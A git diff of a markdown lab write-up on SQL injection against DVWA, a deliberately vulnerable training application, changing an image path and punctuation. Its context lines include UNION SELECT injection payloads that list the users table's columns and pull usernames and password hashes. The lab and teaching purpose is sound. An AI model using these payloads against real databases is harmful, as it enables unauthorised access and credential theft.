@@ -12,7 +12,7 @@ The goal of this write-up is to document and demonstrate SQL Injection vulnerabi
 
 ## Vulnerability Explanation {#section-1}
 
-![](/assets/sql/diagram.png)  
+![](/assets/sql/real.png)  
 
 | Information | Explanation                            |
 |-------------|----------------------------------------|
@@ -88,7 +88,7 @@ Next, the tester figured out  the column names from the dvwa users table.
 ```{bash}
 ' UNION SELECT null, column_name FROM information_schema.columns WHERE table_schema = 'dvwa' AND table_name = 'users' #
 ```
-As a result, the tester retrieved the username and password from the data base
+As a result, the tester retrieved the username and password from the data base.
 
 ```{bash}
 ' UNION SELECT user, password FROM dvwa.users #
